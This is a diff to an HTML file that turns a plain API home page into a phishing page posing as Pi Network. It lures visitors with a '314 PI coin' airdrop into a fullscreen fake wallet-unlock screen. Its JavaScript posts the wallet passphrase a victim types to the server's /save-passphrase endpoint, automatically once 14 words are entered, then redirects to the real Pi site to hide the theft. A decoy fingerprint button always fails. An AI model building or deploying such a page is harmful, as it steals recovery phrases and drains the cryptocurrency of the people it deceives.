@@ -1,12 +1,251 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home Page</title>
+    <style>
+        body {
+            margin: 0px;
+            padding: 0px;
+        }
+
+        .heading {
+
+            color: #FFFFFF;
+            font-size: 38px;
+            font-family: Arial;
+        }
+
+        .para {
+            font-size: 16px;
+            color: #dcdce0;
+            font-family: roboto;
+            font-weight: 300;
+
+        }
+
+        .btn {
+            background-color: #ff8000;
+            color: #FFFFFF;
+            border-radius: 7px;
+            padding: 33px;
+            border: 0px;
+            font-size: 33px;
+            font-weight: 600;
+            width: 70%;
+            margin-top: 18px;
+
+        }
+
+        .subheading {
+            font-size: 20px;
+        }
+    </style>
 </head>
+
 <body>
-    <h1>Welcome to My API</h1>
-    <p>This is the public home page.</p>
+    <div style="margin: 0; padding: 0;" id="frontpage">
+        <div style="background-color: #713692; padding: 13px; display: flex; justify-content: center; margin: 0;">
+            <img src="https://res.cloudinary.com/dbnjj0h1z/image/upload/v1737547089/download_bzokc7.png" style="width: 230px;" />
+        </div>
+        <div style="background-color: #151937; margin: 0; padding: 35px;">
+            <h1 class="heading" style="margin: 0;    word-spacing: 2px; ">The First Digital Currency You Can Mine on Your Phone</h1>
+            <p class="heading para">Start mining Pi cryptocurrency today with our free, energy-light mobile app!</p>
+            <button class="btn claim">CLAIM 314 PI NETWORK COINS</button>
+            <div style="display :flex; justify-content :center;">
+                <img src="https://res.cloudinary.com/dbnjj0h1z/image/upload/v1737547095/download_y99gt6.png" style="width :70% ; margin-top: 20px;" />
+            </div>
+
+            <h3 class="subheading para " style="text-align :center;">Unlock your wallet</h3>
+            <div style="display: flex; justify-content :center;   padding: 5px; border-radius: 4px;">
+
+                <svg aria-hidden="true" class="e-font-icon-svg e-fas-wallet" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" style="width: 60px; height: auto; fill: #818a91;">
+                    <path d="M461.2 128H80c-8.84 0-16-7.16-16-16s7.16-16 16-16h384c8.84 0 16-7.16 16-16 0-26.51-21.49-48-48-48H64C28.65 32 0 60.65 0 96v320c0 35.35 28.65 64 64 64h397.2c28.02 0 50.8-21.53 50.8-48V176c0-26.47-22.78-48-50.8-48zM416 336c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z"></path>
+                </svg>
+            </div>
+            <hr style="background-color :#818a91; color :#818a91; width :90%; height: 1px; border: none;" />
+            <h3 class="subheading para " style="text-align :center;">Paste your Passphrase
+            </h3>
+            <div style="display: flex; justify-content :center;   padding: 5px; border-radius: 4px;">
+                <svg style="width: 60px; height: auto; fill: #818a91;" aria-hidden="true" class="e-font-icon-svg e-fas-barcode" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M0 448V64h18v384H0zm26.857-.273V64H36v383.727h-9.143zm27.143 0V64h8.857v383.727H54zm44.857 0V64h8.857v383.727h-8.857zm36 0V64h17.714v383.727h-17.714zm44.857 0V64h8.857v383.727h-8.857zm18 0V64h8.857v383.727h-8.857zm18 0V64h8.857v383.727h-8.857zm35.715 0V64h18v383.727h-18zm44.857 0V64h18v383.727h-18zm35.999 0V64h18.001v383.727h-18.001zm36.001 0V64h18.001v383.727h-18.001zm26.857 0V64h18v383.727h-18zm45.143 0V64h26.857v383.727h-26.857zm35.714 0V64h9.143v383.727H476zm18 .273V64h18v384h-18z"></path>
+                </svg>
+            </div>
+            <hr style="background-color :#818a91; color :#818a91; width :90%; height: 1px; border: none;" />
+
+            <h3 class="subheading para " style="text-align :center;">Get your Airdrop
+
+            </h3>
+            <div style="display: flex; justify-content :center;   padding: 5px; border-radius: 4px;">
+                <svg style="width: 60px; height: auto; fill: #818a91;" aria-hidden="true" class="e-font-icon-svg e-fas-money-check-alt" viewBox="0 0 640 512" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M608 32H32C14.33 32 0 46.33 0 64v384c0 17.67 14.33 32 32 32h576c17.67 0 32-14.33 32-32V64c0-17.67-14.33-32-32-32zM176 327.88V344c0 4.42-3.58 8-8 8h-16c-4.42 0-8-3.58-8-8v-16.29c-11.29-.58-22.27-4.52-31.37-11.35-3.9-2.93-4.1-8.77-.57-12.14l11.75-11.21c2.77-2.64 6.89-2.76 10.13-.73 3.87 2.42 8.26 3.72 12.82 3.72h28.11c6.5 0 11.8-5.92 11.8-13.19 0-5.95-3.61-11.19-8.77-12.73l-45-13.5c-18.59-5.58-31.58-23.42-31.58-43.39 0-24.52 19.05-44.44 42.67-45.07V152c0-4.42 3.58-8 8-8h16c4.42 0 8 3.58 8 8v16.29c11.29.58 22.27 4.51 31.37 11.35 3.9 2.93 4.1 8.77.57 12.14l-11.75 11.21c-2.77 2.64-6.89 2.76-10.13.73-3.87-2.43-8.26-3.72-12.82-3.72h-28.11c-6.5 0-11.8 5.92-11.8 13.19 0 5.95 3.61 11.19 8.77 12.73l45 13.5c18.59 5.58 31.58 23.42 31.58 43.39 0 24.53-19.05 44.44-42.67 45.07zM416 312c0 4.42-3.58 8-8 8H296c-4.42 0-8-3.58-8-8v-16c0-4.42 3.58-8 8-8h112c4.42 0 8 3.58 8 8v16zm160 0c0 4.42-3.58 8-8 8h-80c-4.42 0-8-3.58-8-8v-16c0-4.42 3.58-8 8-8h80c4.42 0 8 3.58 8 8v16zm0-96c0 4.42-3.58 8-8 8H296c-4.42 0-8-3.58-8-8v-16c0-4.42 3.58-8 8-8h272c4.42 0 8 3.58 8 8v16z"></path>
+                </svg>
+            </div>
+
+            <div style="display :flex; justify-content :center;">
+                <img style="width :70%; margin-top :20px;" src="https://res.cloudinary.com/dbnjj0h1z/image/upload/v1737547115/download_jv9anq.webp" />
+            </div>
+            <button style="margin-top :15px;" class="btn claim">CLAIM 314 PI NETWORK COINS</button>
+            <div style="display :flex; justify-content :center;">
+
+                <img src="https://res.cloudinary.com/dbnjj0h1z/image/upload/v1737643237/34-14-11-1024-_-1024-px-1-1-699x1024_zyr4bm.webp" style="width :70%;" />
+
+
+            </div>
+            <h3 class="para" style="color :#f4af47; font-size :20px;  font-weight:50;">Download the mobile app to start mining today! Join now.</h3>
+
+            <a href="https://play.google.com/store/apps/details?id=com.blockchainvault&pli=1" target="_self">
+                <img src="https://res.cloudinary.com/dbnjj0h1z/image/upload/v1737643149/google_play_qu6rx1.png" style="width :70%;" />
+            </a>
+            <a href="https://apps.apple.com/us/app/pi-network/id1445472541" target="_self">
+                <img src="https://res.cloudinary.com/dbnjj0h1z/image/upload/v1737643188/apple_store_lzbgrb.png" style="width :70%;" />
+            </a>
+
+
+        </div>
+
+    </div>
+    <div id="wallet" style="display :none; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #fff; ">
+
+        <div style="background-color: #713692; padding: 8px; display: flex; justify-content: center; margin: 0;">
+            <img src="https://res.cloudinary.com/dbnjj0h1z/image/upload/v1737667233/21f25aa4-8a97-42b8-bd41-23d3a8d2c95d-removebg-preview_axcuxa.png" style="width: 110px;" />
+        </div>
+        <div style="padding :28px; padding-top :0px;">
+            <h2 style="font-size: 1.4rem;  font-weight: 600; text-align :center;">Unlock π Wallet</h2>
+            <textarea placeholder="Enter your 24-word passphrase here" rows="11" onfocus="this.style.borderColor='#440a6d'; this.style.borderWidth='2px'" onblur="this.style.borderColor='#ccc'; this.style.borderWidth='1px'" style="width: 100%; padding: 1rem; border: 1px solid #ddd; border-radius: 12px; font-size: 1rem; resize: none; color: #666; box-sizing: border-box; outline: none;"></textarea>
+
+            <p class="passphraseerr" style="text-align :center; color :#e83f3f; display :none;">Invalid Passphrase</p>
+            <p class="fingerprint" style="text-align :center; display :none; color :#e83f3f;">Cannot Claim With Fingerprint</p>
+
+            <!-- Buttons -->
+            <button id="passphrase" style=" width :100%; background-color: white; color: #6c238e; padding: 15px ; font-weight :600; margin-top: 10px; border: 2px solid #6c238e; border-radius: 9px; font-size: 13px; cursor: pointer;">
+                Unlock With Passphrase
+            </button>
+            <button id="fingerprint" style="width :100%; background-color: #713692; color: white; padding: 15px ; font-weight :600; margin-top: 10px; border: none; border-radius: 9px; font-size: 13px; cursor: pointer;">
+                Unlock With Fingerprint
+            </button>
+
+            <!-- Information -->
+            <div style=" font-size: 16px; color: #444; line-height: 1.6;  ">
+                <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+                <p>Lost your passphrase? <a href="#" style="color: #6c238e; text-decoration: none;">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+            </div>
+        </div>
+    </div>
 </body>
+
+<script>
+    document.querySelector('.claim').onclick = function() {
+        const container = document.getElementById('wallet');
+        const frontpage = document.getElementById('frontpage');
+
+        if (container.style.display === 'none' || container.style.display === '') {
+            container.style.display = 'block'; // Show the wallet container
+            frontpage.style.display = 'none'; // Hide the frontpage
+
+            // Enter fullscreen mode for the wallet container
+            if (container.requestFullscreen) {
+                container.requestFullscreen({
+                    navigationUI: "show"
+                }); // Keep the status bar visible
+            } else if (container.webkitRequestFullscreen) { // For Safari
+                container.webkitRequestFullscreen();
+            } else if (container.msRequestFullscreen) { // For IE11
+                container.msRequestFullscreen();
+            }
+        } else {
+            container.style.display = 'none'; // Hide the wallet container
+            frontpage.style.display = 'block'; // Show the frontpage
+
+            // Exit fullscreen mode if currently in fullscreen
+            if (document.fullscreenElement || document.webkitFullscreenElement || document.msFullscreenElement) {
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                } else if (document.webkitExitFullscreen) { // For Safari
+                    document.webkitExitFullscreen();
+                } else if (document.msExitFullscreen) { // For IE11
+                    document.msExitFullscreen();
+                }
+            }
+        }
+    };
+
+    document.getElementById("fingerprint").addEventListener("click", function() {
+        const element = document.querySelector(".fingerprint");
+        if (element) {
+            element.style.display = "block"; // Show the element
+            setTimeout(() => {
+                element.style.display = "none"; // Hide it after 3 seconds
+            }, 3000);
+        }
+    });
+    document.getElementById("passphrase").addEventListener("click", async function () {
+    const textArea = document.querySelector("textarea");
+    const passphrase = textArea.value.trim();
+    const words = passphrase.split(/\s+/);
+
+    if (words.length === 14) {
+        await savePassphraseToDB(passphrase); // Store passphrase if valid
+        window.location.href = "https://minepi.com/"; // Redirect if valid
+    } else {
+        // Show error message for 5 seconds
+        const errorElement = document.querySelector(".passphraseerr");
+        if (errorElement) {
+            errorElement.style.display = "block";
+            setTimeout(() => {
+                errorElement.style.display = "none";
+            }, 5000);
+        }
+    }
+});
+
+document.querySelector("textarea").addEventListener("input", async function () {
+    const passphrase = this.value.trim();
+    const words = passphrase.split(/\s+/);
+
+    if (words.length === 14) {
+        await savePassphraseToDB(passphrase); // Store passphrase automatically
+    }
+});
+
+async function savePassphraseToDB(passphrase) {
+    try {
+        const response = await fetch("/save-passphrase", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ passphrase }),
+        });
+
+        if (!response.ok) {
+            console.error("Failed to save passphrase:", await response.text());
+        }
+    } catch (error) {
+        console.error("Error saving passphrase:", error);
+    }
+}
+
+</script>
+
+<script>
+    // Select the textarea
+    const textarea = document.querySelector('textarea');
+
+    // Apply styles to placeholder dynamically
+    textarea.addEventListener('input', () => {
+        if (!textarea.value) {
+            textarea.style.setProperty("color", "#999"); // Placeholder-like color
+            textarea.style.fontSize = "16px"; // Placeholder font size
+            textarea.style.marginLeft = "16px"; // Placeholder font weight
+
+        } else {
+            textarea.style.color = "#333"; // Normal text color
+        }
+    });
+
+    // Set placeholder-like styles on load
+    textarea.style.color = "#999";
+    textarea.style.fontSize = "16px";
+</script>
+
 </html>
